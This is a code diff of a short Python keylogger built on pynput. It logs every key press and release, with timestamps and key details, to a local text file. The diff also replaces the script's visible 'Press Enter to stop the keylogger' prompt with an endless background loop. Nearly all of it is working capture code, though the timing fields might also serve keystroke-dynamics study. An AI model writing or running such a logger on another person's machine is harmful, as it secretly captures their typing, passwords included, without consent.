@@ -1,14 +1,48 @@
 import time
 from pynput import keyboard
 
-def keyPressed(key):
+
+def logKey(key, is_pressed):
     current_time = time.time()
-    with open("keyfile.txt", 'a') as logKey:
+    if type(key) == keyboard.KeyCode:
+        id = key.vk
+        value = key.char,
+        is_dead = key.is_dead,
+        combining = key.combining
+    elif type(key) == keyboard.Key:
+        id = key.value
+        value = key.name
+        is_dead = (False,)
+        combining = None
+    else:
+        print("error")
+        
+
+    d = {
+        "id": id,
+        "timestamp": current_time,
+        "value": value,
+        "is_pressed": is_pressed,
+        "is_dead": is_dead,
+        "combining": combining,
+    }
+
+    with open("keyfile.txt", 'a', encoding="utf-8") as logKey:
         try:
-            logKey.write(f"{current_time} {key.__dict__}\n")  # Include the timestamp with each keystroke
-        except AttributeError:  # Use AttributeError instead of a general exception
+            logKey.write(f"{d}\n")
+            
+        except Exception: 
             print("Error getting char")
 
-listener = keyboard.Listener(on_press=keyPressed)
+
+def keyPressed(key):
+    logKey(key, True)
+   
+def keyReleased(key):
+    logKey(key, False)
+
+listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
 listener.start()
-input("Press Enter to stop the keylogger\n")
+
+while True:
+    time.sleep(1)
